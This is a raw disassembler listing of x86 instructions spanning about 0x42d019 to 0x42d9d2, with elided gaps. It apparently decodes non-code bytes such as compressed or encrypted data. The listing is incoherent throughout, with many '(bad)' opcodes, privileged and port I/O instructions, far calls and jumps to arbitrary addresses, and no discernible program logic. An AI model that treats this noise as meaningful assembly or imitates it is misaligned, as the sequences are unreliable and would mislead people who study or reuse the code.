  42d019:	sub    WORD PTR [eax],di
  42d01c:	add    al,0x23
  42d01e:	jbe    0x42d005
  42d020:	mov    al,0x6d
  42d022:	je     0x42d062
  42d024:	aaa    
  42d025:	popa   
  42d026:	xor    al,0xa1
  42d028:	xchg   eax,ecx
  42d02a:	iret   
  42d02b:	mov    dl,0xbd
  42d02d:	adc    bl,BYTE PTR [edx+0x276cac94]
  42d033:	(bad)  
  42d034:	xchg   edx,eax
  42d035:	xlat   BYTE PTR ds:[ebx]
  42d037:	fidivr WORD PTR [ecx-0x14]
  42d03a:	mov    ebx,0x29412f2c
  42d03f:	and    al,0xf0
  42d041:	lock cmp bl,cl
  42d044:	push   edi
  42d045:	sbb    eax,0x98e87870
  42d04a:	cmp    edi,DWORD PTR [ebp+0x5193c0eb]
  42d050:	cmp    al,0x68
  42d052:	out    dx,eax
  42d053:	push   esp
  42d054:	mov    dl,0x70
  42d056:	sbb    DWORD PTR [edi-0x33],ebp
  42d059:	adc    DWORD PTR [edx-0x4538f300],ebx
  42d05f:	dec    esi
  42d060:	adc    eax,0x4a194745
  42d065:	rol    DWORD PTR [eax-0x30902412],cl
  42d06b:	cmp    al,0x88
  42d06d:	and    ecx,DWORD PTR [eax]
  42d06f:	xor    ch,dh
  42d071:	mov    eax,0xb6d56c0e
  42d076:	sahf   
  42d077:	cdq    
  42d078:	(bad)  
  42d079:	mov    esi,0x2d3e510f
  42d07e:	add    al,0x59
  42d080:	push   ss
  42d081:	inc    ebp
  42d082:	jg     0x42d0ba
  42d084:	sbb    BYTE PTR [edi],dh
  42d086:	mov    cl,0x65
  42d088:	mov    esi,0x1d616a2d
  42d08d:	dec    ecx
  42d08e:	fild   QWORD PTR [esi-0x146ec571]
  42d094:	adc    ah,BYTE PTR [edi-0x184d139]
  42d09a:	addr16 js 0x42d0b3
  42d09d:	dec    ebp
  42d09e:	or     DWORD PTR [ecx+0x1839bcff],edi
  42d0a4:	iret   
  42d0a5:	mov    bh,0xe3
  42d0a7:	outs   dx,BYTE PTR ds:[esi]
  42d0a8:	div    DWORD PTR [esi-0x2b2af323]
  42d0ae:	lahf   
  42d0af:	outs   dx,BYTE PTR ds:[esi]
  42d0b0:	xchg   BYTE PTR [esi+edx*4+0x4d97812f],dh
  42d0b7:	jl     0x42d0fb
  42d0b9:	stos   BYTE PTR es:[edi],al
  42d0ba:	mov    ebx,0xf9eedb23
  42d0bf:	loope  0x42d043
  42d0c1:	pushf  
  42d0c2:	xor    al,0x8
  42d0c4:	mov    dl,0x85
  42d0c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d0c7:	inc    ebp
  42d0c8:	inc    ebx
  42d0c9:	pop    eax
  42d0ca:	(bad)  
  42d0cc:	adc    DWORD PTR [ebp-0x2b68a891],ebp
  42d0d2:	xchg   ebx,eax
  42d0d3:	inc    esi
  42d0d4:	lds    edx,FWORD PTR [ebp-0x1c]
  42d0d7:	push   esi
  42d0d8:	sub    BYTE PTR [ecx],bh
  42d0da:	xor    edi,DWORD PTR [ebp+0x7dc4319f]
  42d0e0:	(bad)  
  42d0e1:	jmp    DWORD PTR [ecx+0x7410ca7]
  42d0e7:	in     eax,0xcc
  42d0e9:	cmp    DWORD PTR [di],edx
  42d0ec:	jg     0x42d0d4
	...
  42d156:	push   eax
  42d157:	cmp    al,dh
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    bl,bl
  42d163:	fnstsw ax
  42d165:	leave  
  42d166:	jcxz   0x42d16a
  42d169:	add    BYTE PTR [eax],al
  42d16b:	add    DWORD PTR [eax],eax
  42d16d:	add    BYTE PTR [ebp+eiz*2+0x29cc3dc6],dl
  42d174:	mov    gs,WORD PTR [ebx+0x5a]
  42d177:	in     eax,dx
  42d178:	push   eax
  42d179:	repnz ins DWORD PTR es:[edi],dx
  42d17b:	and    bh,BYTE PTR [eax-0x24]
  42d17e:	xchg   BYTE PTR [eax],al
  42d180:	not    ch
  42d182:	test   al,0xae
  42d184:	add    DWORD PTR [eax+0x11],eax
  42d187:	mov    esp,DWORD PTR [ebp-0x31]
  42d18a:	leave  
  42d18b:	push   esi
  42d18c:	jb     0x42d1ac
  42d18e:	xor    eax,0x5a46ac8f
  42d193:	aad    0x9e
  42d195:	jmp    0xf645513c
  42d19a:	(bad)  
  42d19b:	adc    DWORD PTR [ecx+0x4],esi
  42d19e:	sub    edi,ebx
  42d1a0:	fs ret 0x6817
  42d1a4:	jmp    0x61926b0b
  42d1a9:	add    BYTE PTR [eax-0x6dfff448],al
  42d1af:	sbb    DWORD PTR [esi+edi*1+0x4a8d04f6],0xffffff97
  42d1b7:	adc    BYTE PTR [edi+ebp*4],dh
  42d1ba:	cmp    al,bh
  42d1bc:	sbb    al,0xfe
  42d1bf:	ins    DWORD PTR es:[edi],dx
  42d1c0:	aam    0x25
  42d1c2:	or     ebp,DWORD PTR [edi]
  42d1c4:	stos   BYTE PTR es:[edi],al
  42d1c5:	(bad)  
  42d1c6:	in     al,dx
  42d1c7:	cs inc esi
  42d1c9:	adc    al,BYTE PTR [esi+eiz*1-0x48]
  42d1cd:	fwait
  42d1ce:	not    BYTE PTR [ebp+0x5a935baf]
  42d1d4:	rcr    BYTE PTR [ebp+0xb67a86],0xcf
  42d1db:	fs jns 0x42d1b3
  42d1de:	pop    esi
  42d1df:	(bad)  
  42d1e1:	lods   al,BYTE PTR ds:[esi]
  42d1e2:	test   BYTE PTR [esp+eiz*8],dh
  42d1e5:	inc    ebp
  42d1e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1e7:	mov    ah,BYTE PTR [ecx+0x6142061b]
  42d1ed:	in     eax,dx
  42d1ee:	jne    0x42d188
  42d1f0:	adc    cl,dh
  42d1f2:	ret    0x7a84
  42d1f5:	pusha  
  42d1f6:	fld    DWORD PTR [ecx+0xd626f32]
  42d1fc:	xchg   esi,eax
  42d1fd:	jne    0x42d1f5
  42d1ff:	push   ebx
  42d200:	jmp    0x42d1dd
  42d202:	loop   0x42d1b1
  42d204:	gs aas 
  42d206:	add    BYTE PTR [esi-0x540b94d0],0x6c
  42d20d:	add    al,0xc2
  42d20f:	(bad)  
  42d211:	scas   eax,DWORD PTR es:[edi]
  42d212:	out    dx,eax
  42d213:	clc    
  42d214:	adc    esi,DWORD PTR [edx]
  42d216:	icebp  
  42d217:	mov    al,ds:0x4959b00c
  42d21c:	gs test dl,bl
  42d21f:	mov    edi,0x435ba3af
  42d224:	hlt    
  42d225:	mov    ebp,0x5c29550b
  42d22a:	in     eax,dx
  42d22b:	dec    esp
  42d22c:	je     0x42d1fb
  42d22e:	out    0x55,eax
  42d230:	mov    edx,0x92552136
  42d235:	call   0xfe53:0x527d9375
  42d23c:	(bad)  
  42d23e:	pop    ds
  42d23f:	rcl    BYTE PTR [esi],0x81
  42d242:	inc    edx
  42d243:	pop    ss
  42d244:	inc    eax
  42d245:	enter  0x8164,0x6
  42d249:	xor    ecx,ebp
  42d24b:	jge    0x42d293
  42d24d:	mov    ecx,ebp
  42d24f:	daa    
  42d250:	push   esp
  42d251:	aas    
  42d252:	push   cs
  42d253:	ja     0x42d273
  42d255:	push   esp
  42d256:	fisttp QWORD PTR [edx-0x568ae1a]
  42d25c:	jl     0x42d246
  42d25e:	sub    eax,0xd5696653
  42d263:	mov    ch,0x3b
  42d265:	jnp    0x42d2de
  42d267:	mov    ah,0x7c
  42d269:	sbb    BYTE PTR [edi+0xa4f85a],bl
	...
  42d2d3:	add    BYTE PTR [eax],al
  42d2d5:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d35d
  42d2e3:	sbb    BYTE PTR [ebx+eax*2+0x1e467],dh
  42d2ea:	add    BYTE PTR [ecx],al
  42d2ec:	add    BYTE PTR [eax],al
  42d2ee:	(bad)  
  42d2ef:	xor    dl,BYTE PTR [edi-0x7d]
  42d2f2:	sbb    esi,DWORD PTR [esi]
  42d2f4:	jb     0x42d2be
  42d2f6:	mov    bh,0x4d
  42d2f8:	adc    dh,BYTE PTR [eax]
  42d2fa:	mov    DWORD PTR [esp+ebp*2],ebx
  42d2fd:	call   0x5261:0x7e8ee35f
  42d304:	mov    eax,ds:0xd313b4b1
  42d309:	fstp   TBYTE PTR [edi+eiz*8-0x2f]
  42d30d:	mov    BYTE PTR ss:[edi+0x1b5f36a7],cl
  42d314:	jbe    0x42d371
  42d316:	stos   BYTE PTR es:[edi],al
  42d317:	pop    ebp
  42d318:	pop    esi
  42d319:	xor    eax,0x6822249
  42d31e:	or     eax,0x4d97616e
  42d323:	sub    WORD PTR [edx+ebx*4],si
  42d327:	out    dx,al
  42d328:	sbb    BYTE PTR [ebx+edx*8],ah
  42d32b:	out    dx,eax
  42d32c:	adc    ebx,DWORD PTR [edi-0xb]
  42d32f:	mov    WORD PTR [ebx+edx*4+0x2c6d4098],?
  42d336:	sub    bl,BYTE PTR [edi]
  42d338:	inc    esp
  42d339:	and    eax,edx
  42d33b:	or     al,0x3a
  42d33d:	inc    ebx
  42d33e:	sbb    eax,0xdb80fbe6
  42d343:	cmp    cl,BYTE PTR [ecx-0x49]
  42d346:	jmp    0x351994c4
  42d34b:	(bad)  
  42d34c:	push   esp
  42d34d:	jg     0x42d347
  42d34f:	pop    ebx
  42d350:	sbb    al,0x68
  42d352:	ins    BYTE PTR es:[edi],dx
  42d353:	mov    esp,0x4ebb8636
  42d358:	dec    ebx
  42d359:	sbb    al,BYTE PTR [esp+eax*2+0x3ad177c6]
  42d360:	aam    0x58
  42d362:	sbb    eax,0xa02f51f5
  42d367:	sti    
  42d368:	cdq    
  42d369:	xor    ebx,DWORD PTR [ebp+0x124886d9]
  42d36f:	mov    ds:0x8ee7fbb3,eax
  42d374:	mov    ch,dh
  42d376:	dec    edi
  42d377:	loopne 0x42d360
  42d379:	int3   
  42d37a:	in     eax,dx
  42d37b:	add    esp,esi
  42d37d:	push   ecx
  42d37e:	or     edx,ebx
  42d380:	mov    DWORD PTR [edx],edi
  42d382:	xor    DWORD PTR [esi-0x5fba4bbc],0x5797a0b6
  42d38c:	sbb    al,0x4b
  42d38e:	push   eax
  42d38f:	clc    
  42d390:	fisttp DWORD PTR [ebp+0x65]
  42d393:	xor    eax,0x89766414
  42d398:	popf   
  42d399:	sub    BYTE PTR [eax],cl
  42d39b:	je     0x42d3ab
  42d39d:	test   al,0xc0
  42d39f:	aas    
  42d3a0:	hlt    
  42d3a1:	shl    BYTE PTR [eax-0x28],cl
  42d3a4:	xor    BYTE PTR [ecx+0x34a8e83d],dh
  42d3aa:	enter  0x9c64,0xa8
  42d3ae:	mov    DWORD PTR [esi-0x344783f8],ebx
  42d3b4:	mov    ecx,ecx
  42d3b6:	cmp    al,0xf3
  42d3b8:	push   edx
  42d3b9:	pop    ecx
  42d3ba:	sub    DWORD PTR [esp+ecx*2],ecx
  42d3bd:	call   0x7a41:0xcd0983d7
  42d3c4:	sub    al,0xf4
  42d3c6:	call   0x7666:0x558db49a
  42d3cd:	into   
  42d3ce:	jns    0x42d387
  42d3d0:	(bad)  
  42d3d1:	loopne 0x42d37e
  42d3d3:	retf   0xeddb
  42d3d6:	dec    eax
  42d3d7:	jg     0x42d3dc
  42d3d9:	inc    edx
  42d3da:	sbb    eax,0xf4121197
  42d3df:	sbb    al,0x6c
  42d3e1:	push   ebp
  42d3e2:	(bad)  
  42d3e3:	out    dx,eax
  42d3e4:	inc    esi
  42d3e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d3e6:	imul   edi,edi,0xddb7c62
  42d3ec:	adc    dl,ah
	...
  42d456:	ror    esi,0x63
  42d459:	cdq    
  42d45a:	outs   dx,DWORD PTR ds:[esi]
  42d45b:	mov    ebp,0x9459defb
  42d460:	aaa    
  42d461:	pushf  
  42d462:	test   DWORD PTR [esi-0x1a9836a9],ecx
  42d468:	add    DWORD PTR [eax],eax
  42d46a:	add    BYTE PTR [ecx],al
  42d46c:	add    BYTE PTR [eax],al
  42d46e:	cld    
  42d46f:	outs   dx,BYTE PTR ds:[esi]
  42d470:	pop    esp
  42d471:	xchg   edx,eax
  42d472:	dec    ebx
  42d473:	and    ebp,DWORD PTR [edi-0x15]
  42d476:	test   BYTE PTR [edi+0x79],al
  42d479:	cs pop ss
  42d47b:	sbb    DWORD PTR [eax-0x2e],ecx
  42d47e:	test   BYTE PTR [ebp+edx*4-0x39fe3230],ch
  42d485:	pusha  
  42d486:	out    dx,eax
  42d487:	inc    ebp
  42d488:	(bad)  
  42d489:	mov    eax,0x606975c2
  42d48e:	xchg   ebp,eax
  42d48f:	and    al,0x3b
  42d491:	gs push edx
  42d494:	repnz jmp FWORD PTR [eax+0x7f]
  42d498:	dec    eax
  42d499:	jno    0x42d495
  42d49b:	jb     0x42d42d
  42d49d:	jbe    0x42d431
  42d49f:	push   ebp
  42d4a0:	xchg   ebp,eax
  42d4a1:	xchg   ebp,eax
  42d4a2:	mov    al,0x78
  42d4a4:	ja     0x42d4a1
  42d4a6:	stos   DWORD PTR es:[edi],eax
  42d4a7:	aas    
  42d4a8:	cmp    DWORD PTR [edi-0x1f],esp
  42d4ab:	mov    ebx,0xeb2b765c
  42d4b0:	jp     0x42d4d9
  42d4b2:	xlat   BYTE PTR ds:[ebx]
  42d4b3:	mov    ch,0xa4
  42d4b5:	arpl   WORD PTR [edx],sp
  42d4b7:	dec    ecx
  42d4b8:	xchg   BYTE PTR [ebp+0x21],bh
  42d4bb:	int    0xf3
  42d4bd:	inc    ecx
  42d4be:	scas   al,BYTE PTR es:[edi]
  42d4bf:	and    esi,esp
  42d4c1:	xor    al,0xef
  42d4c3:	test   eax,0x9583b0f3
  42d4c8:	js     0x42d49a
  42d4ca:	jl     0x42d4f7
  42d4cc:	fsubr  QWORD PTR [esi]
  42d4ce:	(bad)  [ecx+0x21]
  42d4d1:	adc    al,0x6d
  42d4d3:	jno    0x42d50e
  42d4d5:	(bad)  
  42d4d6:	mul    eax
  42d4d8:	adc    eax,0x5eb2ffd1
  42d4dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4de:	pop    eax
  42d4df:	stos   DWORD PTR es:[edi],eax
  42d4e0:	push   eax
  42d4e1:	stos   BYTE PTR es:[edi],al
  42d4e2:	push   0x1ad9a311
  42d4e7:	push   edi
  42d4e8:	mov    ebp,0xf1dd674a
  42d4ed:	add    DWORD PTR ds:0xfbed5123,edi
  42d4f3:	push   cs
  42d4f4:	dec    edx
  42d4f5:	push   0xffffff9b
  42d4f7:	mov    edx,0x872245b5
  42d4fc:	inc    ecx
  42d4fd:	xor    edx,0x8
  42d500:	xor    edi,DWORD PTR [ebp-0x334cebaa]
  42d506:	pop    esi
  42d507:	lahf   
  42d508:	inc    edi
  42d509:	jnp    0x42d4cc
  42d50b:	pop    ds
  42d50c:	into   
  42d50d:	and    eax,0x2d6d8402
  42d512:	in     eax,dx
  42d513:	scas   al,BYTE PTR es:[edi]
  42d514:	pop    ds
  42d515:	mov    eax,0x5d74ada1
  42d51a:	push   ss
  42d51b:	jle    0x42d4c5
  42d51d:	daa    
  42d51e:	sti    
  42d51f:	sub    eax,0x62fbaa8c
  42d524:	adc    al,0x8a
  42d526:	cli    
  42d527:	cmp    ebx,esi
  42d529:	out    0xb3,eax
  42d52b:	sbb    ebx,eax
  42d52d:	cmc    
  42d52e:	stos   DWORD PTR es:[edi],eax
  42d52f:	pop    ds
  42d530:	rcl    DWORD PTR [edx],0x6a
  42d533:	pop    edi
  42d534:	inc    ebx
  42d535:	or     dh,BYTE PTR [edi]
  42d537:	jge    0x42d599
  42d539:	jbe    0x42d59f
  42d53b:	xor    al,0x6f
  42d53d:	test   eax,0x1ba6f126
  42d542:	arpl   di,sp
  42d544:	push   ebx
  42d545:	icebp  
  42d546:	sbb    edx,DWORD PTR [edx]
  42d548:	sub    ecx,0x42
  42d54b:	test   al,0x82
  42d54d:	sub    eax,ebx
  42d54f:	rol    ebp,1
  42d551:	push   ebx
  42d552:	stc    
  42d553:	imul   ecx,ecx,0x4
  42d556:	scas   al,BYTE PTR es:[edi]
  42d557:	jmp    esp
  42d559:	push   ecx
  42d55a:	sbb    ebx,DWORD PTR [edx-0x55da18f2]
  42d560:	or     bh,BYTE PTR [edi-0xe213c6f]
  42d566:	jmp    0xeb3f:0x4bf78539
  42d56d:	fiadd  WORD PTR [eax]
	...
  42d5d3:	add    BYTE PTR [eax],al
  42d5d5:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d5db:	ja     0x42d5b6
  42d5dd:	call   FWORD PTR [ebp+0x3e]
  42d5e0:	mov    ds:0x311986d5,eax
  42d5e5:	dec    esp
  42d5e6:	addr16 out 0x1,al
  42d5e9:	add    BYTE PTR [eax],al
  42d5eb:	add    DWORD PTR [eax],eax
  42d5ed:	add    BYTE PTR [edx],bh
  42d5ef:	repz jnp 0x42d5e4
  42d5f2:	sbb    al,0x2b
  42d5f4:	and    al,0xd5
  42d5f6:	loop   0x42d5e4
  42d5f8:	add    ch,BYTE PTR [esi-0x6feb3032]
  42d5fe:	add    dh,dl
  42d600:	pusha  
  42d601:	jo     0x42d61d
  42d603:	loop   0x42d5f1
  42d605:	cdq    
  42d606:	and    eax,0xd00a6ce6
  42d60b:	std    
  42d60c:	adc    eax,0xd4674e9d
  42d611:	les    ebx,FWORD PTR [eax]
  42d613:	push   edi
  42d614:	pop    ss
  42d615:	pusha  
  42d616:	cs out dx,eax
  42d618:	jnp    0x42d5d8
  42d61a:	mov    al,0x53
  42d61c:	lock imul esp,eax,0x8685fe17
  42d623:	scas   eax,DWORD PTR es:[edi]
  42d624:	mov    DWORD PTR [ebx+0x4cb4ff88],esp
  42d62a:	mov    BYTE PTR [eax+0x28],0xa6
  42d62e:	and    DWORD PTR [eax-0x44],eax
  42d631:	loope  0x42d5b3
  42d633:	cld    
  42d634:	dec    ecx
  42d635:	dec    esp
  42d636:	scas   eax,DWORD PTR es:[edi]
  42d637:	daa    
  42d638:	inc    ebx
  42d639:	cli    
  42d63a:	loope  0x42d613
  42d63c:	int    0xc5
  42d63e:	(bad)  
  42d63f:	xor    edi,DWORD PTR [eax-0x48]
  42d642:	pop    esi
  42d643:	icebp  
  42d644:	fisub  DWORD PTR [eax]
  42d646:	cdq    
  42d647:	(bad)  
  42d648:	xchg   edi,eax
  42d649:	in     eax,dx
  42d64a:	scas   eax,DWORD PTR es:[edi]
  42d64b:	test   DWORD PTR [ebx+0x4790a3d9],esi
  42d651:	scas   eax,DWORD PTR es:[edi]
  42d652:	dec    ebp
  42d653:	loope  0x42d60b
  42d655:	lds    esi,FWORD PTR [ebp+eax*1+0x43144932]
  42d65c:	inc    ebx
  42d65d:	fisubr DWORD PTR [ebp-0x7]
  42d660:	push   es
  42d661:	data16 test BYTE PTR [ecx],ch
  42d664:	sbb    eax,0x6a3ebf01
  42d669:	dec    ebx
  42d66a:	call   0x3380113f
  42d66f:	rcl    ah,1
  42d671:	arpl   WORD PTR [ebx+0x56],bx
  42d674:	add    DWORD PTR ds:0x2623d6c1,ebp
  42d67a:	mov    ch,0xc1
  42d67c:	loope  0x42d629
  42d67e:	dec    esp
  42d67f:	(bad)  
  42d680:	(bad)  
  42d681:	sub    bl,BYTE PTR ds:0x12212ed7
  42d687:	fld    TBYTE PTR [ebp+edx*1+0x2b]
  42d68b:	xor    edx,ecx
  42d68d:	mov    ah,0x20
  42d68f:	jnp    0x42d6ec
  42d691:	repz jmp 0x40240a53
  42d697:	ja     0x42d631
  42d699:	fdiv   st,st(4)
  42d69b:	push   esi
  42d69c:	or     al,0x58
  42d69e:	out    dx,eax
  42d69f:	lods   eax,DWORD PTR ds:[esi]
  42d6a0:	cmc    
  42d6a1:	out    dx,al
  42d6a2:	cli    
  42d6a3:	pop    es
  42d6a4:	pop    ds
  42d6a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d6a6:	hlt    
  42d6a7:	mov    cl,0xfc
  42d6a9:	cwde   
  42d6aa:	jo     0x42d712
  42d6ac:	int3   
  42d6ad:	gs pop esi
  42d6af:	push   ebx
  42d6b0:	jp     0x42d679
  42d6b2:	pop    ebx
  42d6b3:	iret   
  42d6b4:	adc    eax,0x6b3ee127
  42d6b9:	mov    WORD PTR [edi+0x74032cb4],ds
  42d6bf:	push   edi
  42d6c0:	test   BYTE PTR [esi+0x390c7a68],bh
  42d6c6:	sub    eax,0x39fabf47
  42d6cb:	add    eax,0x50a2433d
  42d6d0:	imul   ebp,ebp,0x1f
  42d6d3:	pop    ebp
  42d6d4:	iret   
  42d6d5:	adc    al,BYTE PTR [ebx]
  42d6d7:	sbb    DWORD PTR [ebp+0x1ab47882],ecx
  42d6dd:	nop
  42d6de:	imul   edi,DWORD PTR [esi+0xf],0xe830a312
  42d6e5:	adc    al,0xf
  42d6e7:	pop    ds
  42d6e8:	sbb    DWORD PTR [edx+0x7206541f],0x0
	...
  42d756:	repz add esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0xf2
  42d763:	cmc    
  42d764:	mov    edx,0x1e76729
  42d769:	add    BYTE PTR [eax],al
  42d76b:	add    DWORD PTR [eax],eax
  42d76d:	add    BYTE PTR [ebx+0x2],bl
  42d770:	cmp    eax,0x5d619950
  42d775:	(bad)  
  42d776:	fld    TBYTE PTR [ebp+0x43712c04]
  42d77c:	test   BYTE PTR [ebx+0xcd89d6f],bh
  42d782:	xchg   BYTE PTR [ebp-0x36],cl
  42d785:	and    bh,ah
  42d787:	push   edi
  42d788:	pop    ebx
  42d789:	and    ebx,DWORD PTR [edx+0x2a4307e6]
  42d78f:	sub    BYTE PTR [esi-0xce4c0ec],dh
  42d795:	iret   
  42d796:	stos   DWORD PTR es:[edi],eax
  42d797:	aam    0x30
  42d799:	sub    al,0x56
  42d79b:	dec    ebp
  42d79c:	add    bl,bl
  42d79e:	mov    WORD PTR [ecx-0x43ecfef5],es
  42d7a4:	inc    esi
  42d7a5:	xor    esi,0xffffffa2
  42d7a8:	push   DWORD PTR [ecx]
  42d7aa:	test   eax,0x1e65de32
  42d7af:	data16 jbe 0x42d769
  42d7b2:	inc    esp
  42d7b3:	jo     0x42d7dd
  42d7b5:	hlt    
  42d7b6:	pushf  
  42d7b7:	pop    ss
  42d7b8:	mov    bh,0x6f
  42d7ba:	sub    ah,BYTE PTR [ebx+eax*1]
  42d7bd:	mov    esp,0x21446764
  42d7c2:	inc    edx
  42d7c3:	loope  0x42d843
  42d7c5:	cwde   
  42d7c6:	pop    edx
  42d7c7:	add    BYTE PTR [esi],ch
  42d7c9:	fst    DWORD PTR [edx]
  42d7cb:	scas   eax,DWORD PTR es:[edi]
  42d7cc:	xlat   BYTE PTR ds:[ebx]
  42d7cd:	lsl    ebx,bx
  42d7d0:	in     al,0xfa
  42d7d2:	xor    DWORD PTR [ebp+0x7ed578e4],edx
  42d7d8:	repz mov ds:0x9290cea2,al
  42d7de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d7df:	mov    ch,0x6e
  42d7e1:	adc    esi,edx
  42d7e3:	push   cs
  42d7e4:	test   eax,0x9fe8e862
  42d7e9:	and    eax,0x45f3ebc
  42d7ee:	sahf   
  42d7ef:	stos   BYTE PTR es:[edi],al
  42d7f0:	xchg   ebx,eax
  42d7f1:	cwde   
  42d7f2:	(bad)  ds:0x19bdd488
  42d7f8:	out    0xdd,eax
  42d7fa:	mov    ds:0x411fb3dd,eax
  42d7ff:	les    ecx,FWORD PTR [ebx+0x760e6619]
  42d805:	popa   
  42d806:	mov    ds:0x47b3e342,al
  42d80b:	xchg   BYTE PTR [eax-0x33],al
  42d80e:	fld    st(3)
  42d810:	adc    cl,BYTE PTR [eax+0x2d4b7dec]
  42d816:	adc    BYTE PTR [esi+0xe88f005],bh
  42d81c:	adc    eax,0xaf155797
  42d821:	or     ah,al
  42d823:	adc    BYTE PTR [esi+0x45],cl
  42d826:	sbb    BYTE PTR [edx+0x25],bh
  42d829:	pop    edx
  42d82a:	fsubp  st(1),st
  42d82c:	(bad)  
  42d82d:	jne    0x42d87c
  42d82f:	aaa    
  42d830:	sbb    eax,DWORD PTR [edi-0x2e104ddf]
  42d836:	push   ecx
  42d837:	xchg   edi,eax
  42d838:	call   0xf57f:0x1bf8bddd
  42d83f:	daa    
  42d840:	jl     0x42d8a1
  42d842:	mov    bh,0x8f
  42d844:	out    0x17,eax
  42d846:	or     al,0x98
  42d848:	popa   
  42d849:	shr    DWORD PTR [edx+ecx*2+0x6c0b7bcb],cl
  42d850:	sbb    edi,DWORD PTR [ebp-0x3290811]
  42d856:	jno    0x42d8c5
  42d858:	jmp    0x96f0cd7a
  42d85d:	mov    bl,BYTE PTR [eax]
  42d85f:	inc    ecx
  42d860:	fisub  DWORD PTR [edx+edi*2+0x1c]
  42d864:	clts   
  42d866:	mov    ds:0x49ee90b0,eax
  42d86b:	push   esp
  42d86c:	push   ebp
  42d86d:	pop    ds
	...
  42d8d6:	xchg   esi,eax
  42d8d7:	fwait
  42d8d8:	cwde   
  42d8d9:	pop    edi
  42d8da:	popf   
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0xedc6961a
  42d8e3:	fnstcw WORD PTR [esi-0x36]
  42d8e6:	addr16 call 0x142d8ed
  42d8ec:	add    BYTE PTR [eax],al
  42d8ee:	push   ebp
  42d8ef:	retf   0x72f3
  42d8f2:	mov    dl,0x60
  42d8f4:	xor    esi,ebp
  42d8f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d8f7:	adc    BYTE PTR [edi],dh
  42d8f9:	shl    DWORD PTR [edx+ecx*2-0xbc85c80],0xd2
  42d901:	pop    ebx
  42d902:	outs   dx,BYTE PTR es:[esi]
  42d904:	ds pop edi
  42d906:	hlt    
  42d907:	inc    ebp
  42d908:	loopne 0x42d8d9
  42d90a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d90b:	xor    esp,esi
  42d90d:	mov    eax,0x60197d2c
  42d912:	xor    eax,0xef4eee4
  42d917:	mov    BYTE PTR [edi+0xc9fee80],cl
  42d91d:	or     al,0x5b
  42d91f:	mov    al,0x80
  42d921:	jmp    0xb311:0x81931709
  42d928:	xchg   esp,eax
  42d929:	test   eax,0xd7548a51
  42d92e:	jecxz  0x42d8be
  42d930:	ins    BYTE PTR es:[edi],dx
  42d931:	jo     0x42d96b
  42d933:	adc    DWORD PTR [edi-0x4c249be],0x4f4a922b
  42d93d:	std    
  42d93e:	pop    edx
  42d93f:	xchg   ebx,eax
  42d940:	mov    DWORD PTR [esi-0x65],eax
  42d943:	cmp    eax,0x34fe98e0
  42d948:	xchg   esp,eax
  42d949:	and    eax,0x2f83c3ce
  42d94e:	outs   dx,DWORD PTR ds:[esi]
  42d94f:	pop    ebp
  42d950:	in     al,dx
  42d951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d952:	in     al,dx
  42d953:	icebp  
  42d954:	push   ebx
  42d955:	mul    DWORD PTR [ebx-0x50]
  42d958:	sbb    DWORD PTR [ecx+0x70],edi
  42d95b:	pop    edx
  42d95c:	xchg   ebp,eax
  42d95d:	dec    eax
  42d95e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d95f:	clc    
  42d960:	cmp    DWORD PTR [ebp-0x10],eax
  42d963:	mov    al,0xac
  42d965:	mov    ?,WORD PTR [ebx+ebx*4-0x7a7b115e]
  42d96c:	mov    edx,0xfd96a699
  42d971:	sbb    DWORD PTR [esi-0x2d615a4c],esi
  42d977:	and    DWORD PTR [ebx],esi
  42d979:	retf   
  42d97a:	inc    ebx
  42d97b:	into   
  42d97c:	stc    
  42d97d:	arpl   sp,bp
  42d97f:	loop   0x42d938
  42d981:	fmul   DWORD PTR [ecx+0x2f18ced]
  42d987:	std    
  42d988:	sbb    bh,al
  42d98a:	push   ss
  42d98b:	mov    bl,0x8e
  42d98d:	ficomp DWORD PTR [eax+0x74a1b232]
  42d993:	xchg   edx,eax
  42d994:	pop    esp
  42d995:	fld    DWORD PTR [edx]
  42d997:	ds xchg esi,eax
  42d999:	fldenv [ebp+0x4e]
  42d99c:	loop   0x42d91e
  42d99e:	add    eax,DWORD PTR [ebx+ecx*8-0x60]
  42d9a2:	lea    eax,[ebp-0x311174ec]
  42d9a8:	aam    0x56
  42d9aa:	ret    0x4ae6
  42d9ad:	fidivr DWORD PTR [esi-0x1b]
  42d9b0:	xlat   BYTE PTR ds:[ebx]
  42d9b1:	jae    0x42d9c4
  42d9b3:	stc    
  42d9b4:	mov    bl,0x21
  42d9b6:	mov    dh,0x9a
  42d9b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d9b9:	scas   eax,DWORD PTR es:[edi]
  42d9ba:	retf   
  42d9bb:	xchg   ecx,eax
  42d9bc:	mov    dl,BYTE PTR [esi-0x480d9a6b]
  42d9c2:	mov    edx,0xa8571ad
  42d9c7:	scas   al,BYTE PTR es:[edi]
  42d9c8:	pusha  
  42d9c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d9ca:	fmulp  st(0),st
  42d9cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d9ce:	ret    0x7447
  42d9d1:	inc    edx
  42d9d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
